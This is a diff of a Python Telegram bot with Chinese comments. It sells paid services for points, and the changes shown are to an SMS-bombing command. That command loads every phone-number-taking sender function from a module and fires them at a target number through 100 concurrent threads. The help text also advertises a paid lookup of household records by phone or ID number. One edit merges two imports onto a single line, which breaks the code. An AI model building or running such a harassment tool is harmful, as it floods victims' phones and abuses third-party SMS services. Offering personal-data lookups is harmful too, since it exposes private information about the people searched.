@@ -9,10 +9,9 @@ import itertools
 import binascii
 import random
 import concurrent.futures
-import inspect  # 新增：用于深度扫描接口
+import inspect  # 核心：用于深度扫描接口
 import sms_list 
-from sms_list import * 
-from Crypto.Cipher import DES3
+from sms_list import * from Crypto.Cipher import DES3
 from datetime import datetime
 from telebot import types
 from concurrent.futures import ThreadPoolExecutor
@@ -232,20 +231,19 @@ def run_batch_task(chat_id, msg_id, name, id_list, uid):
     except: pass
     bot.send_message(chat_id, success_match if success_match else "❌ **未发现匹配结果**", parse_mode='Markdown')
 
-# ================= 5. 核心：接口加载器 =================
+# ================= 5. 核心：接口全量加载器 =================
 
 def get_all_senders():
-    """✨ 全量加载：扫描 sms_list.py 中所有带手机号参数的函数"""
+    """✨ 全自动扫描：动态加载 sms_list 中所有的接口函数"""
     all_funcs = []
-    # 排除不需要执行的辅助函数或内置变量
-    excludes = ['generate_random_user_agent', 'replace_phone_in_data', 'platform_request_worker', 'send_minute_request']
+    # 辅助工具和非接口函数排除名单
+    excludes = ['generate_random_user_agent', 'replace_phone_in_data', 'platform_request_worker', 'send_minute_request', 'get_current_timestamp']
     
-    # 获取 sms_list 中的所有成员
+    # 扫描模块中的所有函数
     for name, obj in inspect.getmembers(sms_list):
-        # 只要是函数，且不在排除名单里
         if inspect.isfunction(obj) and name not in excludes:
             try:
-                # 进一步验证：函数必须能接收一个参数（手机号）
+                # 自动核验该函数是否支持接收一个手机号参数
                 sig = inspect.signature(obj)
                 if len(sig.parameters) >= 1:
                     all_funcs.append(obj)
@@ -264,19 +262,19 @@ def sms_bomb_cmd(message):
     target = parts[1]
     if not (len(target) == 11 and target.isdigit()): return bot.reply_to(message, "⚠️ 手机号格式错误")
     
-    # 动态获取当前所有可用接口
+    # 实时获取合并后的最新接口列表
     all_funcs = get_all_senders()
-    bot.reply_to(message, f"🎯 **已激活接口：{len(all_funcs)}个**\n正在对 `{target}` 开启火力覆盖...", parse_mode='Markdown')
+    bot.reply_to(message, f"🎯 **接口装载成功：{len(all_funcs)}个**\n正在对 `{target}` 发起全面轰炸...", parse_mode='Markdown')
     
     user_points[uid] -= 5.5; save_points()
 
     def do_bomb():
         random.shuffle(all_funcs)
-        # 接口多，并发数建议维持在 80-100 左右
+        # 并发效率配置
         with concurrent.futures.ThreadPoolExecutor(max_workers=100) as executor:
             for func in all_funcs:
                 executor.submit(func, target)
-        bot.send_message(message.chat.id, f"✅ 目标 `{target}` 轰炸一轮结束")
+        bot.send_message(message.chat.id, f"✅ 目标 `{target}` 任务执行完毕")
     
     threading.Thread(target=do_bomb).start()
 
@@ -409,7 +407,7 @@ def handle_callback(call):
             "每次核验扣除 0.5 积分\n"
             "——————————————————\n"
             "河北全户查询\n"
-            "发送手机号或身份证直接查询\n"
+            "发送 /hb 进行查询\n"
             "每次查询扣除 5.5 积分\n"
         )
         bot.edit_message_text(help_text, call.message.chat.id, call.message.message_id, reply_markup=get_help_markup())
